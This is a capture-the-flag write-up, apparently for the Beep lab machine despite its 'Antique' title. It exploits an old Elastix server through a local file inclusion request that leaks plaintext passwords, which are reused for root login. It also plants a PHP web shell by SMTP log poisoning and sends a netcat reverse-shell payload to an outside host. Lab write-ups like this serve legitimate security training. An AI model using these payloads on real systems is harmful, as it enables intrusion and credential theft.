# Antique
```
Difficulty: Easy
Operating System: Linux
Hints: True
```
## Initial Enumeration
Running nmap scan (TCP) on the target shows the following
```

```
Poking around on port 443 we can see an elastix service on the webroot and a freePBX service running under /admin route.
under /help and scroll to backup we can see some screenshots dated 2010. so we know that elastix version is quite old.
According to http://freshmeat.sourceforge.net/projects/elastix we can see that the release version should be 2.0/2.2.
So we can searchsploit for elastix.
```
[root@kali Beep ]$ searchsploit elastix                
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                    | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                 | php/webapps/37637.pl
Elastix < 2.5 - PHP Code Injection                                               | php/webapps/38091.php
Elastix 2.x - Blind SQL Injection                                                | php/webapps/36305.txt
Elastix - Multiple Cross-Site Scripting Vulnerabilities                          | php/webapps/38544.txt
Elastix - 'page' Cross-Site Scripting                                            | php/webapps/38078.py
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                           | php/webapps/18650.py
--------------------------------------------------------------------------------- ---------------------------------
```
The below two are good candidates, so let's test them.
```
[root@kali Beep ]$ searchsploit elastix                
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                 | php/webapps/37637.pl
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                           | php/webapps/18650.py
--------------------------------------------------------------------------------- ---------------------------------
```

## User
### Method 1 php/webapps/37637.pl and Password Reuse
Using 37637.pl, we can simply open burp and perform the following request:
```
GET /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action HTTP/1.1
Host: 10.10.10.7
Cookie: elastixSession=3oqenhc7bvtjcid4iuqpag7341; PHPSESSID=3bb02vcbjco3ntj9odbumor1o4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Cache-Control: max-age=0
Te: trailers
Connection: close
```
as a response we can see that we can access a local system file, exploiting a LFI, in fact as a response, we do get: (TL;DR most of the commented line has been removed)
```
HTTP/1.1 200 OK
Date: Mon, 01 Nov 2021 19:23:56 GMT
Server: Apache/2.2.3 (CentOS)
X-Powered-By: PHP/5.1.6
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 13779

AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

AMPBIN=/var/lib/asterisk/bin
AMPSBIN=/usr/local/sbin

AMPWEBROOT=/var/www/html
AMPCGIBIN=/var/www/cgi-bin

FOPWEBROOT=/var/www/html/panel
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE

ARI_ADMIN_USERNAME=admin

ARI_ADMIN_PASSWORD=jEhdIekWmdjE

AUTHTYPE=database

AMPADMINLOGO=logo.png

AMPEXTENSIONS=extensions

ENABLECW=no
ZAP2DAHDICOMPAT=true

MOHDIR=mohmp3

AMPMODULEXML=http://mirror.freepbx.org/
AMPMODULESVN=http://mirror.freepbx.org/modules/
AMPDBNAME=asterisk

ASTETCDIR=/etc/asterisk
ASTMODDIR=/usr/lib/asterisk/modules
ASTVARLIBDIR=/var/lib/asterisk
ASTAGIDIR=/var/lib/asterisk/agi-bin
ASTSPOOLDIR=/var/spool/asterisk
ASTRUNDIR=/var/run/asterisk
ASTLOGDIR=/var/log/asteriskSorry! Attempt to access restricted file.
```
Here, we can see repeatedly more than once the password ```jEhdIekWmdjE```, we can test if this box is affected from a password reuse vulnerability.
We can try to ssh as root into the box using the the discovered password, and as we can se we do get a prompt

### Method 2 php/webapps/37637.pl getting RCE from LFI using SMTP
Always by using 37637.pl, we can get an RCE from a LFI.
From the initial nmap scan, we can see that port 25 (smtp) is opened.
We know that using smtp we can send email connecting to port 25, when we send emails, a file is written under /var/mail/%RCPT_USER%.
Now we need to check what is the user that is executing the webserver, so that then, we can send an email with a payload to that user, read the email using LFI and get a shell.
To check what is the webserver user we can use the LFI vulnerability and request ```/proc/self/status```, and we'll get the following:
```
Name:	httpd
State:	R (running)
SleepAVG:	89%
Tgid:	3589
Pid:	3589
PPid:	3488
TracerPid:	0
Uid:	100	100	100	100
Gid:	101	101	101	101
FDSize:	32
Groups:	101
VmPeak:	   35900 kB
VmSize:	   35888 kB
VmLck:	       0 kB
VmHWM:	   16428 kB
VmRSS:	   16428 kB
VmData:	   12336 kB
VmStk:	      88 kB
VmExe:	     300 kB
VmLib:	   20928 kB
VmPTE:	      72 kB
StaBrk:	0919c000 kB
Brk:	09bcc000 kB
StaStk:	bfbb2b20 kB
ExecLim:	08497000
Threads:	1
SigQ:	0/16384
SigPnd:	0000000000000000
ShdPnd:	0000000000000000
SigBlk:	0000000000000000
SigIgn:	0000000001001000
SigCgt:	000000018c00466b
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
Cpus_allowed:	00000001
Mems_allowed:	1
```
As we can see we do get Uid 100 and Pid 101, checking with ```/etc/passwd``` we can see that this Uid is related to the user asterisk.
now we can send an email to asterisk@localhost connecting to port 25:
```
Trying 10.10.10.7...
Connected to 10.10.10.7.
Escape character is '^]'.
HELO b0d.beep220 beep.localdomain ESMTP Postfix
.htb
250 beep.localdomain
VRFY asterisk@localhost
252 2.0.0 asterisk@localhost
MAIL FROM:<b0d@haha.com>
250 2.1.0 Ok
RCPT TO:<asterisk@localhost>
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: you got pwned
<?php system($_REQUEST['cmd']);?>
.
250 2.0.0 Ok: queued as 862C3D92FD
QUIT
221 2.0.0 Bye
Connection closed by foreign host.
```
Now that we have our payload uploaded, we can perform the following request and get a shell:
```
POST /vtigercrm/graph.php HTTP/1.1
Host: 10.10.10.7
Cookie: elastixSession=3oqenhc7bvtjcid4iuqpag7341; PHPSESSID=3bb02vcbjco3ntj9odbumor1o4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Cache-Control: max-age=0
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 175

current_language=../../../../../../../..//var/mail/asterisk%00&module=Accounts&action=&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.18+4444+>/tmp/f
```

### Method 3 php/webapps/18650.py
As discovered in the initial enumeration phase we have another exploit that is elegible for a successul exploitation 

## Root
### Method 1 GTFOBins
### Method 2 Dirty Cow
